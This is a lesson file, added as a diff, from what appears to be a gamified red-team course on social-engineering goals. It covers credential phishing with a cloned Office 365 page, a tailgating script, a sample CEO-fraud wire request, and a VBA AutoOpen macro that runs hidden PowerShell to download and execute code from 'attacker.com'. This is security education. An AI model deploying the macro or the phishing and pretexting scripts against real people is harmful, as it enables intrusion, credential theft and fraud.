@@ -1,0 +1,114 @@
+{
+    "id": "l5",
+    "chapterId": "ch_1",
+    "title": "Common Goals & Payloads",
+    "description": "What are we actually trying to steal or accomplish in the real world?",
+    "xpReward": 25,
+    "estimatedMinutes": 5,
+    "section": "Frameworks",
+    "slides": [
+        {
+            "id": "s_l5_1",
+            "type": "text",
+            "title": "The Endgame 🏁",
+            "content": "# Why Are We Doing This?\n\nIn a penetration test, Social Engineering is just the **Initial Access Vector**. The end goal is usually further down the kill chain.\n\n| Goal | Description | Social Engineering Tactic |\n| :--- | :--- | :--- |\n| **Credentials** | Username & Password | Phishing Link, Vishing Help Desk |\n| **Remote Access** | Malware Install (RAT) | Malicious Macro in 'Invoice.doc' |\n| **Physical Access** | Getting inside the building | Tailgating, Fake Fire Inspection |\n| **Data Exfil** | Stealing files | Convincing user to email file to 'personal account' |\n| **Financial** | Money Transfer | CEO Fraud / BEC Scam |"
+        },
+        {
+            "id": "s_l5_2",
+            "type": "text",
+            "title": "Goal 1: Credential Harvesting 📝",
+            "content": "## The Most Common Ask\n\n**Why it's powerful:** People reuse passwords. Their LinkedIn password is often their Corporate VPN password.\n\n**Technique:**\n1.  Send email: \"Your Office 365 password expires in 2 hours. **Keep Same Password** [Link].\"\n2.  Link goes to a clone of the Office 365 login page.\n3.  User types password. Page shows 'Success! Password Extended.'\n4.  Attacker now has **Valid Credentials**."
+        },
+        {
+            "id": "s_l5_3",
+            "type": "quiz",
+            "title": "Payload Check 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l5_1",
+                "type": "multiple_choice",
+                "question": "You are on a Red Team. Your goal is to demonstrate the risk of data leakage. Which Social Engineering goal aligns with this?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Crashing the company website (Availability)",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Tricking HR into emailing you the employee W-2 forms (Data Exfil)",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Installing a crypto miner (Financial)",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Getting the cafeteria menu",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. W-2 forms are highly sensitive PII. Getting them emailed externally is a classic data exfiltration test.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l5_4",
+            "type": "code",
+            "title": "Goal 2: Remote Access Trojan (RAT) 🐀",
+            "content": "Getting the user to run our code.",
+            "codeSnippet": "Sub AutoOpen()\n    ' This is VBA Macro Malware\n    Dim strCmd As String\n    strCmd = \"powershell -NoP -C IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')\"\n    Shell strCmd, vbHide\nEnd Sub",
+            "codeLanguage": "vba",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l5_5",
+            "type": "text",
+            "title": "Goal 3: Physical Access 🏢",
+            "content": "## The Clip Board Method\n\nThis is the **king** of physical Social Engineering.\n\n1.  **Prop:** Wear a hard hat or carry a clipboard with a fake 'Service Ticket' printout.\n2.  **Approach:** Wait at a secure door smoking a cigarette (or pretending to vape).\n3.  **Action:** When an employee badges in, look frustrated and pat your pockets.\n4.  **Phrase:** *\"Dammit, left my badge in the truck. Mind grabbing the door? My hands are full.\"*\n5.  **Success Rate:** > 90%."
+        },
+        {
+            "id": "s_l5_6",
+            "type": "warning",
+            "title": "Goal 4: Business Email Compromise (BEC) 💰",
+            "content": "## The $26 Billion Scam\n\n**The Setup:** Attacker spoofs the **CEO's** email address.\n**The Target:** The **CFO** or **Accounts Payable** clerk.\n**The Message:** *\"Hey, we're closing the Acme deal today. Need you to wire $45k to this escrow account urgently. I'm in a meeting, can't talk. Confirm when done.\"*\n\n**Why it works:** Power Distance. The clerk is scared to question the CEO. They rush to get it done to please the boss.\n\n**Red Flag:** Urgency + Secrecy + New Banking Info = **SCAM**."
+        },
+        {
+            "id": "s_l5_7",
+            "type": "quiz",
+            "title": "BEC Defense 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l5_2",
+                "type": "multiple_choice",
+                "question": "What is the SINGLE most effective control against a CEO Fraud/BEC wire transfer scam?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Spam Filter",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Strong Passwords",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Out-of-Band Verification (Call the CEO on a known number)",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Email Encryption",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. Out-of-Band means using a different communication channel. If the email asks for a wire, PICK UP THE PHONE and call the person using the number in your contacts app, not the number in the email.",
+                "xpReward": 10
+            }
+        }
+    ]
+}
